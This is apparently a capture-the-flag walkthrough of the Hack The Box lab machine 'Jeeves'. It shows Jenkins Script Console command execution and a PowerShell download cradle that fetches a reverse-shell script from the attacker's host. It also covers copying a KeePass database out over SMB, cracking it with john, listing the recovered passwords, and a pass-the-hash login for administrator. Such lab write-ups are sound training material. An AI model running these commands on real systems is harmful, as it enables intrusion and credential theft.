Jeeves

https://www.hackthebox.eu/home/machines/profile/114

* Author: mrb3n
* Series: HTB

## Scan target using nmap

### Service Scan
```
nmap -sV 10.10.10.63
Starting Nmap 7.70 ( https://nmap.org ) at 2018-05-24 15:53 MDT
Nmap scan report for 10.10.10.63
Host is up (0.18s latency).
Not shown: 995 filtered ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 10.0
135/tcp   open  msrpc              Microsoft Windows RPC
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
50000/tcp open  http               Jetty 9.4.z-SNAPSHOT
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.93 seconds
```

two http ports stand out
Going to run dirbuster on them
80, 50000

## Running Dirbuster 

### on IIS 10.0
```
dirbuster -u http://10.10.10.63 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
```

### on JETTY 9.4
```
dirbuster -u http://10.10.10.63:50000 -l /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 15
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
Dir found: /askjeeves/ - 200
Dir found: /askjeeves/about/ - 200
Dir found: / - 200
File found: /error.html - 200
File found: /jeeves.PNG - 200
Dir found: /askjeeves/people/ - 200

```

Testing out 10.10.10.63:50000/askjeeves
Discovered, anonymous access, navigated to Manage Jenkins
Clicked Script Console -

Type in an arbitrary Groovy script and execute it on the server. 
Useful for trouble-shooting and diagnostics. 
Use the ‘println’ command to see the output (if you use System.out, it will go to the server’s stdout, which is harder to see.) Example:

println(Jenkins.instance.pluginManager.plugins)

All the classes from all the plugins are visible. jenkins.*, jenkins.model.*, hudson.*, and hudson.model.* are pre-imported.

## Groovy Script Testing

### Simple WHoami
```
cmd = "whoami"
println cmd.execute().text

Result

jeeves\kohsuke
```	
### Running deeper directory traversal
```
cmd = "cmd.exe /c dir"
println cmd.execute().text
 
Result

 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\.jenkins

05/27/2018  03:12 PM    <DIR>          .
05/27/2018  03:12 PM    <DIR>          ..
05/27/2018  05:27 PM                48 .owner
05/27/2018  03:00 PM             1,756 config.xml
05/27/2018  02:46 PM               156 hudson.model.UpdateCenter.xml
05/27/2018  03:12 PM             1,178 hudson.plugins.emailext.ExtendedEmailPublisher.xml
11/03/2017  10:43 PM               374 hudson.plugins.git.GitTool.xml
11/03/2017  10:33 PM             1,712 identity.key.enc
11/03/2017  10:46 PM                94 jenkins.CLI.xml
12/24/2017  03:35 PM            75,276 jenkins.err.log
11/03/2017  10:47 PM           360,448 jenkins.exe
11/03/2017  10:47 PM               331 jenkins.exe.config
05/27/2018  02:47 PM                 4 jenkins.install.InstallUtil.lastExecVersion
11/03/2017  10:45 PM                 4 jenkins.install.UpgradeWizard.state
11/03/2017  10:46 PM               138 jenkins.model.DownloadSettings.xml
12/24/2017  03:38 PM             2,688 jenkins.out.log
05/27/2018  02:45 PM                 4 jenkins.pid
11/03/2017  10:46 PM               169 jenkins.security.QueueItemAuthenticatorConfiguration.xml
11/03/2017  10:46 PM               162 jenkins.security.UpdateSiteWarningsConfiguration.xml
11/03/2017  10:47 PM        74,271,222 jenkins.war
05/27/2018  02:45 PM            34,147 jenkins.wrapper.log
11/03/2017  10:49 PM             2,881 jenkins.xml
11/03/2017  10:33 PM    <DIR>          jobs
11/03/2017  10:33 PM    <DIR>          logs
05/27/2018  02:47 PM               907 nodeMonitors.xml
11/03/2017  10:33 PM    <DIR>          nodes
11/03/2017  10:44 PM    <DIR>          plugins
11/03/2017  10:47 PM               129 queue.xml.bak
11/03/2017  10:33 PM                64 secret.key
11/03/2017  10:33 PM                 0 secret.key.not-so-secret
12/24/2017  03:47 AM    <DIR>          secrets
11/08/2017  09:52 AM    <DIR>          updates
11/03/2017  10:33 PM    <DIR>          userContent
11/03/2017  10:33 PM    <DIR>          users
11/03/2017  10:47 PM    <DIR>          war
11/03/2017  10:43 PM    <DIR>          workflow-libs
              24 File(s)     74,753,892 bytes
              12 Dir(s)   7,267,758,080 bytes free

``` 

Now that there is discovered script access > we can move onto shell access
Google Search > found nishang powershell framework
Created www folder added Invoke-PowerShellTcp.ps1 (Added Example line to bottom of file to run)
Created a NC listener for powershell execution

## Testing for Shell access

### running Groovy download sCript
```
cmd = """powershell "IEX(new-object net.webclient).downloadstring('http://10.10.14.59/test.ps1')" """
println cmd.execute().text


nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.59] from (UNKNOWN) [10.10.10.63] 49680
Windows PowerShell running as user kohsuke on JEEVES
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\.jenkins>whoami
jeeves\kohsuke
```

Now that we have a shell with a viable user... let's see if this user has a user.txt

## User.txt

```
PS C:\Users\kohsuke\Desktop> dir


    Directory: C:\Users\kohsuke\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        11/3/2017  11:22 PM             32 user.txt  
```

### Check Documents
```
PS C:\Users\kohsuke\Documents> dir


    Directory: C:\Users\kohsuke\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx 
```

Identified an interesting file CEH.kdbx >> keypass database


### Transfer File
```
Set up impacket-smbserver

impacket-smbserver test `pwd`
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.63,49690)
[*] AUTHENTICATE_MESSAGE (JEEVES\kohsuke,JEEVES)
[*] User kohsuke\JEEVES authenticated successfully
[*] kohsuke::JEEVES:4141414141414141:6872ce749c0b89499a9e8458795dab68:010100000000000080f24675a1f5d301725852b88a9d989


Powershell Command:
New-PSDrive -Name "NewTest" -PSProvider "FileSystem" -Root "\\10.10.14.59\test"
```

### Copy CEH.kdbx ot new FileShare
```
PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.59\test1> cp c:\Users\kohsuke\Documents\CEH.kdbx .
```

Copy file to crackable format


## Cracking Hashes

### Copy keepass2John
```
root@kali:~/Downloads/CTF-Walkthrough/HTB/jeeves/smb# keepass2john CEH.kdbx > jeeves.hash
```

### Run John with rockyou wordlist
```
root@kali:~/Downloads/CTF-Walkthrough/HTB/jeeves/hashes# john jeeves.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64 OpenSSL])
Press 'q' or Ctrl-C to abort, almost any other key for status
moonshine1       (CEH)
1g 0:00:01:02 DONE (2018-05-27 04:44) 0.01591g/s 874.9p/s 874.9c/s 874.9C/s moonshine1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Open KeePass
Look through passwords
note:
 - it's a secret, admin, localhost
 - Keys to the kingdom, bob, lCEUnYPjNfIuPZSzOySA
 - DC Recovery PW, administrator, S1TjAtJHKsugh9oC4VZl
 - Jenkins admin, admin, 
 - Backup stuff, ? , [HASH]

Tried multiple forms to login to box
Finally.... using pth-winexe and the [HASH] obtain shell

```
root@kali:~/Downloads/CTF-Walkthrough/HTB/jeeves# pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe
Enter password: 
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
jeeves\administrator
```

### Navigate to root.txt
```
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,209,095,168 bytes free

C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
```

Much Frustration and digging.... to finally find

```
C:\Users\Administrator\Desktop>dir /r
dir /r
 Volume in drive C has no label.
 Volume Serial Number is BE50-B1C9

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   7,209,095,168 bytes free
```


Researching how to pull out stream data

### Got Root
```
C:\Users\Administrator\Desktop>powershell (Get-Content hm.txt -Stream root.txt)
powershell (Get-Content hm.txt -Stream root.txt)
```














